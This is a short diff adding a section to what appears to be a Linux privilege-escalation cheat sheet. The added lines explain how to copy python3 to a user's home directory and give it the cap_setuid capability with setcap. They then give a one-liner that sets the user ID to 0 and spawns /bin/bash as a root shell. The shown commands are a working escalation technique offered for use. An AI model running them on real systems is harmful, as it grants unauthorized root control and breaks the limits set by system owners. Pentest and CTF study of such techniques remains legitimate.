@@ -336,6 +336,19 @@ render_with_liquid: false
         setcap cap_setuid+ep /path/to/binary
         ```
 
+        If you found the **setcap** with **SUID**, you can manipulate commands like Python.
+
+        ```sh
+        cp /usr/bin/python3 /home/<current-user>/python3
+        setcap cap_setuid+ep /home/<current-user>/python3
+        ```
+
+        Then get a root shell.
+
+        ```sh
+        /home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+        ```
+
 9. **Get Sensitive Contents in Files**
 
     ```sh
